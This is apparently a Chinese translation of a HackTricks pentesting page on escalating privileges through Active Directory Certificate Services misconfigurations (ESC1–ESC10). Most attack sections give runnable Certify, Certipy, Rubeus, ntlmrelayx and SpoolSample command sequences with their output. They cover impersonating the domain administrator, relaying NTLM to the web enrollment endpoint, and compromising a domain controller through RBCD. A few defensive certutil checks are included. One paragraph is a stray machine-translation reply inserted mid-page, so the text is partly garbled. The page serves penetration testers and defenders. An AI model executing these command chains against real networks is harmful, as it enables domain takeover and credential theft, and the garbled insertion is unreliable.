# AD CS 域提升

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 配置错误的证书模板 - ESC1

### 解释

* **企业 CA** 授予**低权限用户注册权**
* **禁用了管理者审批**
* **不需要授权签名**
* 过于宽松的**证书模板**安全描述符**授予低权限用户证书注册权**
* **证书模板定义了启用认证的 EKUs**：
* _客户端认证 (OID 1.3.6.1.5.5.7.3.2), PKINIT 客户端认证 (1.3.6.1.5.2.3.4), 智能卡登录 (OID 1.3.6.1.4.1.311.20.2.2), 任何目的 (OID 2.5.29.37.0), 或无 EKU (SubCA)._
* **证书模板允许请求者在 CSR 中指定 subjectAltName：**
* 如果**存在**，**AD** 将使用证书的 **subjectAltName** (SAN) 字段中指定的身份。因此，如果请求者可以在 CSR 中指定 SAN，请求者可以**以任何人的身份请求证书**（例如，域管理员用户）。证书模板的 AD 对象在其 **`mspki-certificate-name-`**`flag` 属性中**指定**请求者**是否可以指定 SAN**。`mspki-certificate-name-flag` 属性是一个**位掩码**，如果存在 **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** 标志，**请求者可以指定 SAN。**

{% hint style="danger" %}
这些设置允许**低权限用户请求具有任意 SAN 的证书**，允许低权限用户通过 Kerberos 或 SChannel 以域中任何主体的身份进行认证。
{% endhint %}

例如，为了允许产品或部署服务即时生成 HTTPS 证书或主机证书，通常会启用此选项。或者是因为缺乏知识。

请注意，当创建具有此最后选项的证书时会出现**警告**，但如果复制具有此配置的**证书模板**（如启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板），则不会出现警告（然后管理员可能会添加一个认证 OID）。

### 滥用

要**找到易受攻击的证书模板**，您可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**滥用此漏洞以冒充管理员**，可以运行：
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
然后您可以将生成的**证书转换为`.pfx`**格式，并使用它来**使用Rubeus或certipy再次进行认证**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 二进制文件 "Certreq.exe" 和 "Certutil.exe" 可以被滥用来生成 PFX：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

此外，以下 LDAP 查询在针对 AD 林的配置架构运行时，可以用来**枚举**不需要批准/签名的**证书模板**，这些模板具有**客户端认证或智能卡登录 EKU**，并启用了 **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** 标志：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 配置错误的证书模板 - ESC2

### 解释

第二种滥用场景是第一种的变体：

1. 企业CA授予低权限用户注册权。
2. 管理员批准被禁用。
3. 不需要授权签名。
4. 过于宽松的证书模板安全描述符授予低权限用户证书注册权。
5. **证书模板定义了任何用途的EKU或没有EKU。**

**任何用途的EKU**允许攻击者获取用于**任何目的**的**证书**，如客户端认证、服务器认证、代码签名等。可以使用与**ESC3**相同的**技术**来滥用这一点。

**没有EKUs的证书**——一个下级CA证书——也可以被滥用于**任何目的**，但也**可以用来签署新证书**。因此，使用下级CA证书，攻击者可以在新证书中**指定任意EKUs或字段**。

然而，如果**下级CA不被**`NTAuthCertificates`**对象信任**（默认情况下不会），攻击者**无法创建**用于**域认证**的新证书。尽管如此，攻击者仍然可以创建带有**任何EKU**和任意证书值的**新证书**，攻击者可能潜在地**滥用**这些证书（例如，代码签名、服务器认证等），这对网络中的其他应用程序（如SAML、AD FS或IPSec）可能有很大的影响。

以下LDAP查询在针对AD林的配置模式运行时，可以用来枚举符合此场景的模板：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置不当的注册代理模板 - ESC3

### 解释

这个场景类似于第一个和第二个，但是**滥用**了**不同的 EKU**（证书请求代理）和**两个不同的模板**（因此它有两套要求），

**证书请求代理 EKU**（OID 1.3.6.1.4.1.311.20.2.1），在微软文档中称为**注册代理**，允许一个主体代表另一个用户**注册**一个**证书**。

**“注册代理”**注册这样一个**模板**，并使用结果**证书共同签署一个 CSR 代表另一个用户**。然后它**发送**这个**共同签署的 CSR**到 CA，注册一个**允许“代表注册”的模板**，CA 回应一个属于“另一个”用户的**证书**。

**要求 1:**

1. 企业 CA 允许低权限用户注册权。
2. 管理员批准被禁用。
3. 不需要授权签名。
4. 过于宽松的证书模板安全描述符允许低权限用户注册证书。
5. **证书模板定义了证书请求代理 EKU**。证书请求代理 OID (1.3.6.1.4.1.311.20.2.1) 允许代表其他主体请求其他证书模板。

**要求 2:**

1. 企业 CA 允许低权限用户注册权。
2. 管理员批准被禁用。
3. **模板架构版本 1 或大于 2，并指定了一个应用策略发布要求，要求证书请求代理 EKU。**
4. 证书模板定义了一个允许域认证的 EKU。
5. CA 上没有实施注册代理限制。

### 滥用

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来滥用这个场景：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
企业级CA可以通过打开`certsrc.msc` `snap-in -> 右键点击CA -> 点击属性 -> 导航`到“注册代理”标签页，来**限制**可以**获取**注册代理证书的**用户**，注册代理可以注册的模板，以及注册代理可以代表哪些**账户**行动。

然而，**默认**的CA设置是“**不限制注册代理**”。即使管理员启用了“限制注册代理”，默认设置也是极其宽松的，允许任何人作为任何人注册所有模板。

## 易受攻击的证书模板访问控制 - ESC4

### **解释**

**证书模板**有一个**安全描述符**，指定了哪些AD**主体**对模板有特定的**权限**。

如果**攻击者**有足够的**权限**去**修改**一个**模板**并**创建**前面章节中的任何可利用的**配置错误**，他将能够利用它并**提升权限**。

对证书模板的有趣权限包括：

* **Owner（所有者）：** 对象的隐式完全控制权，可以编辑任何属性。
* **FullControl（完全控制）：** 对象的完全控制权，可以编辑任何属性。
* **WriteOwner（写所有者）：** 可以将所有者修改为攻击者控制的主体。
* **WriteDacl（写访问控制列表）：** 可以修改访问控制以授予攻击者FullControl权限。
* **WriteProperty（写属性）：** 可以编辑任何属性

### 滥用

一个类似前面的权限提升例子：

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4是指用户对证书模板有写权限。例如，这可以被滥用来覆盖证书模板的配置，使模板易受ESC1的攻击。

正如我们在上面的路径中看到的，只有`JOHNPC`有这些权限，但我们的用户`JOHN`有新的`AddKeyCredentialLink`边缘到`JOHNPC`。由于这项技术与证书有关，我也实现了这种攻击，这被称为[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。这里有Certipy的`shadow auto`命令的一个小预览，用来检索受害者的NT哈希。

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy**可以用一个命令覆盖证书模板的配置。**默认情况下**，Certipy将**覆盖**配置以使其**易受ESC1攻击**。我们还可以指定**`-save-old`参数来保存旧配置**，这在我们攻击后**恢复**配置时会很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### 说明

影响AD CS安全的基于ACL的相互关联关系网非常广泛。一些**证书模板和证书授权机构之外的对象**也可能对**整个AD CS系统的安全产生影响**。这些可能性包括（但不限于）：

* **CA服务器的AD计算机对象**（例如，通过S4U2Self或S4U2Proxy妥协）
* **CA服务器的RPC/DCOM服务器**
* 在容器`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`中的任何**后代AD对象或容器**（例如，证书模板容器、认证机构容器、NTAuthCertificates对象、注册服务容器等）

如果低权限攻击者能够**控制其中任何一个**，攻击者很可能**妥协PKI系统**。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 说明

还有一个类似的问题，在[**CQure Academy文章**](https://cqureacademy.com/blog/enhanced-key-usage)中有描述，涉及到**`EDITF_ATTRIBUTESUBJECTALTNAME2`**标志。正如微软所描述的，“**如果**这个标志在CA上被**设置**，**任何请求**（包括当主题是从Active Directory®构建的时候）都可以在**主题备用名称**中包含**用户定义的值**。”\
这意味着**攻击者**可以注册**任何**配置为域**认证**的模板，同时也**允许无特权**用户注册（例如，默认的用户模板），并**获取证书**，使我们能够**认证**为域管理员（或**任何其他活跃的用户/机器**）。

**注意**：这里的**备用名称**是通过`certreq.exe`的`-attrib "SAN:"`参数（即“名称值对”）包含在CSR中的。这与在ESC1中**滥用SANs**的方法**不同**，因为它是**将账户信息存储在证书属性中，而不是证书扩展中**。

### 滥用

组织可以使用以下`certutil.exe`命令**检查设置是否启用**：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
下面这个命令实际上就是使用了**远程** **注册表**，因此以下命令也可能同样有效：
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 也可以检查这个问题，并且可以用来滥用这种错误配置：
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
这些设置可以在任何系统上进行**设置**，假设有**域管理员**（或同等）权限：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
如果您在环境中发现此设置，您可以使用以下命令**移除此标志**：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
在 2022 年 5 月的安全更新之后，新的**证书**将具有一个**安全扩展**，该扩展会**嵌入**请求者的 `objectSid` 属性。对于 ESC1，此属性将反映自指定的 SAN，但对于**ESC6**，此属性反映的是**请求者的 `objectSid`**，而不是来自 SAN。\
因此，**要滥用 ESC6**，环境必须容易受到 ESC10 的攻击（证书映射弱点），在这种情况下，**SAN 会被优先于新的安全扩展**。
{% endhint %}

## 易受攻击的证书授权访问控制 - ESC7

### 攻击 1

#### 解释

证书授权本身具有一套**权限集**，用于保护各种**CA 操作**。这些权限可以通过 `certsrv.msc` 访问，右键单击 CA，选择属性，然后切换到安全性选项卡：

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

这也可以通过 [**PSPKI 模块**](https://www.pkisolutions.com/tools/pspki/) 使用 `Get-CertificationAuthority | Get-CertificationAuthorityAcl` 来枚举：
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### 滥用

如果您拥有在**证书颁发机构**上具有**`ManageCA`** 权限的主体，我们可以使用 **PSPKI** 远程翻转 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 位以**允许 SAN** 在任何模板中指定（[ECS6](domain-escalation.md#editf_attributesubjectaltname2-esc6)）：

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

这也可以用更简单的形式通过 [**PSPKI 的 Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet 实现。

**`ManageCertificates`** 权限允许**批准待处理的请求**，因此绕过了“CA 证书管理员批准”保护。

您可以使用 **Certify** 和 **PSPKI** 模块的**组合**来请求证书，批准它，并下载它：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### 攻击 2

#### 解释

{% hint style="warning" %}
在**前一个攻击**中，使用了**`Manage CA`** 权限来**启用** **EDITF\_ATTRIBUTESUBJECTALTNAME2** 标志以执行 **ESC6 攻击**，但在重启 CA 服务（`CertSvc`）之前，这不会产生任何效果。当用户拥有 `Manage CA` 访问权限时，用户也被允许**重启服务**。然而，这**并不意味着用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，**ESC6 可能在大多数打了补丁的环境中无法立即使用**。
{% endhint %}

因此，这里介绍另一种攻击方法。

先决条件：

* 仅需 **`ManageCA` 权限**
* **`Manage Certificates`** 权限（可以通过 **`ManageCA`** 授予）
* 证书模板 **`SubCA`** 必须是**启用**状态（可以通过 **`ManageCA`** 启用）

这项技术依赖于一个事实，即拥有 `Manage CA` _和_ `Manage Certificates` 访问权限的用户可以**发放失败的证书请求**。**`SubCA`** 证书模板**容易受到 ESC1 的攻击**，但**只有管理员**可以注册该模板。因此，一个**用户**可以**请求**注册 **`SubCA`** - 这将被**拒绝** - 但**之后可以由管理员发放**。

#### 滥用

你可以通过将你的用户添加为新的官员，**授予自己 `Manage Certificates`** 访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以使用 `-enable-template` 参数在 CA 上**启用**。默认情况下，`SubCA` 模板是启用的。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已经满足了这次攻击的先决条件，我们可以开始**基于`SubCA`模板**请求一个证书。

**这个请求将会被拒绝**，但我们将保存私钥并记录下请求ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
使用我们的 **`管理CA` 和 `管理证书`**，我们可以使用 `ca` 命令和 `-issue-request <request ID>` 参数来**颁发失败的证书**请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用`req`命令和`-retrieve <request ID>`参数**检索已颁发的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay 到 AD CS HTTP 端点 – ESC8

### 解释

{% hint style="info" %}
总结来说，如果一个环境安装了 **AD CS**，并且有一个 **易受攻击的 web 登记端点**，至少发布了一个允许 **域计算机注册和客户端认证** 的 **证书模板**（如默认的 **`Machine`** 模板），那么 **攻击者可以危害任何运行打印服务的计算机**！
{% endhint %}

AD CS 支持通过额外的 AD CS 服务器角色安装的几种 **基于 HTTP 的注册方法**。这些基于 HTTP 的证书注册接口都 **容易受到 NTLM 中继攻击**。使用 NTLM 中继，攻击者在 **被危害的机器上可以冒充任何进行入站 NTLM 认证的 AD 账户**。在冒充受害者账户时，攻击者可以访问这些 web 接口并 **基于 `User` 或 `Machine` 证书模板请求客户端认证证书**。

* **web 登记接口**（一个旧式的 ASP 应用程序，可以在 `http://<caserver>/certsrv/` 访问），默认只支持 HTTP，无法防止 NTLM 中继攻击。此外，它明确只允许通过其 Authorization HTTP 头使用 NTLM 认证，因此更安全的协议如 Kerberos 无法使用。
* **证书登记服务**（CES）、**证书登记策略**（CEP）Web 服务和 **网络设备登记服务**（NDES）默认通过其 Authorization HTTP 头支持协商认证。协商认证 **支持** Kerberos 和 **NTLM**；因此，攻击者可以在中继攻击期间 **协商使用 NTLM** 认证。这些 web 服务至少默认启用了 HTTPS，但不幸的是 HTTPS 本身 **无法防止 NTLM 中继攻击**。只有将 HTTPS 与通道绑定结合使用时，才能保护 HTTPS 服务免受 NTLM 中继攻击。不幸的是，AD CS 没有在 IIS 上启用扩展的身份验证保护，这是启用通道绑定所必需的。

NTLM 中继攻击的常见 **问题** 是 **NTLM 会话通常很短**，并且攻击者 **无法** 与 **强制 NTLM 签名** 的服务进行交互。

然而，滥用 NTLM 中继攻击来获取用户证书解决了这些限制，因为会话将持续与证书有效期一样长，且证书可以用来使用 **强制 NTLM 签名** 的服务。要了解如何使用被盗证书，请查看：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM 中继攻击的另一个限制是它们 **需要受害者账户向攻击者控制的机器进行认证**。攻击者可以等待或尝试 **强制** 发生：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **滥用**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify) 的 `cas` 命令可以枚举 **启用的 HTTP AD CS 端点**：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

企业CA还会在其AD对象的`msPKI-Enrollment-Servers`属性中**存储CES端点**。**Certutil.exe**和**PSPKI**可以解析并列出这些端点：
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Since there is no English text provided outside of the markdown and HTML syntax, there is nothing to translate. If you have specific English text that you would like translated into Chinese, please provide it, and I will be happy to assist.
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### 利用 Certify 进行滥用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### 利用 [Certipy](https://github.com/ly4k/Certipy) 进行攻击

默认情况下，Certipy 会根据 `Machine` 或 `User` 模板请求证书，这取决于被中继的账户名是否以 `$` 结尾。可以通过 `-template` 参数指定另一个模板。

然后我们可以使用像 [PetitPotam](https://github.com/ly4k/PetitPotam) 这样的技术来强制认证。对于域控制器，我们必须指定 `-template DomainController`。
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无安全扩展 - ESC9 <a href="#5485" id="5485"></a>

### 解释

ESC9 指的是新的 **`msPKI-Enrollment-Flag`** 值 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)。如果在证书模板上设置了这个标志，则**新的 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展**将**不会**被嵌入。ESC9 仅在 `StrongCertificateBindingEnforcement` 设置为 `1`（默认值）时有用，因为较弱的证书映射配置对于 Kerberos 或 Schannel 可以被滥用为 ESC10 —— 如果没有 ESC9 —— 因为要求将会相同。

* `StrongCertificateBindingEnforcement` 未设置为 `2`（默认值：`1`）或 `CertificateMappingMethods` 包含 `UPN` 标志
* 证书包含 `msPKI-Enrollment-Flag` 值中的 `CT_FLAG_NO_SECURITY_EXTENSION` 标志
* 证书指定任何客户端认证 EKU
* 对任何账户 A 有 `GenericWrite` 权限以妥协任何账户 B

### 滥用

在这种情况下，`John@corp.local` 对 `Jane@corp.local` 有 `GenericWrite` 权限，我们希望妥协 `Administrator@corp.local`。`Jane@corp.local` 被允许注册证书模板 `ESC9`，该模板在 `msPKI-Enrollment-Flag` 值中指定了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

首先，我们获取 `Jane` 的哈希值，例如使用 Shadow Credentials（利用我们的 `GenericWrite`）。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

接下来，我们将 `Jane` 的 `userPrincipalName` 更改为 `Administrator`。注意我们留下了 `@corp.local` 部分。

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

这不是一个约束违规，因为 `Administrator` 用户的 `userPrincipalName` 是 `Administrator@corp.local` 而不是 `Administrator`。

现在，我们请求易受攻击的证书模板 `ESC9`。我们必须作为 `Jane` 请求证书。

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

注意证书中的 `userPrincipalName` 是 `Administrator` 并且发行的证书不包含“对象 SID”。

然后，我们将 `Jane` 的 `userPrincipalName` 更改回其他内容，比如她原来的 `userPrincipalName` `Jane@corp.local`。

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

现在，如果我们尝试使用证书进行认证，我们将收到 `Administrator@corp.local` 用户的 NT 哈希值。您需要在命令行中添加 `-domain <domain>`，因为证书中没有指定域。

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## 弱证书映射 - ESC10

### 解释

ESC10 指的是域控制器上的两个注册表键值。

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`。默认值 `0x18` (`0x8 | 0x10`)，之前为 `0x1F`。

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`。默认值 `1`，之前为 `0`。

**情况 1**

`StrongCertificateBindingEnforcement` 设置为 `0`

**情况 2**

`CertificateMappingMethods` 包含 `UPN` 位 (`0x4`)

### 滥用情况 1

* `StrongCertificateBindingEnforcement` 设置为 `0`
* 对任何账户 A 有 `GenericWrite` 权限以妥协任何账户 B

在这种情况下，`John@corp.local` 对 `Jane@corp.local` 有 `GenericWrite` 权限，我们希望妥协 `Administrator@corp.local`。滥用步骤几乎与 ESC9 相同，除了可以使用任何证书模板。

首先，我们获取 `Jane` 的哈希值，例如使用 Shadow Credentials（利用我们的 `GenericWrite`）。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

接下来，我们将 `Jane` 的 `userPrincipalName` 更改为 `Administrator`。注意我们留下了 `@corp.local` 部分。

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

这不是一个约束违规，因为 `Administrator` 用户的 `userPrincipalName` 是 `Administrator@corp.local` 而不是 `Administrator`。

现在，我们请求任何允许客户端认证的证书，例如默认的 `User` 模板。我们必须作为 `Jane` 请求证书。

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

注意证书中的 `userPrincipalName` 是 `Administrator`。

然后，我们将 `Jane` 的 `userPrincipalName` 更改回其他内容，比如她原来的 `userPrincipalName` `Jane@corp.local`。

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

现在，如果我们尝试使用证书进行认证，我们将收到 `Administrator@corp.local` 用户的 NT 哈希值。您需要在命令行中添加 `-domain <domain>`，因为证书中没有指定域。

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### 滥用情况 2

* `CertificateMappingMethods` 包含 `UPN` 位标志 (`0x4`)
* 对任何账户 A 有 `GenericWrite` 权限以妥协没有 `userPrincipalName` 属性的任何账户 B（机器账户和内置域管理员 `Administrator`）

在这种情况下，`John@corp.local` 对 `Jane@corp.local` 有 `GenericWrite` 权限，我们希望妥协域控制器 `DC$@corp.local`。

首先，我们获取 `Jane` 的哈希值，例如使用 Shadow Credentials（利用我们的 `GenericWrite`）。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

接下来，我们将 `Jane` 的 `userPrincipalName` 更改为 `DC$@corp.local`。

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

这不是一个约束违规，因为 `DC$` 计算机账户没有 `userPrincipalName`。

现在，我们请求任何允许客户端认证的证书，例如默认的 `User` 模板。我们必须作为 `Jane` 请求证书。

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>

然后，我们将 `Jane` 的 `userPrincipalName` 更改回其他内容，比如她原来的 `userPrincipalName` (`Jane@corp.local`)。

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

现在，由于这个注册表键适用于 Schannel，我们必须使用证书通过 Schannel 进行认证。这就是 Certipy 新的 `-ldap-shell` 选项的用武之地。

如果我们尝试使用证书和 `-ldap-shell` 进行认证，我们会注意到我们被认证为 `u:CORP\DC$`。这是服务器发送的字符串。

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

LDAP shell 可用的命令之一是 `set_rbcd`，它将在目标上设置基于资源的受限委派（RBCD）。因此，我们可以执行 RBCD 攻击来妥协域控制器。

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

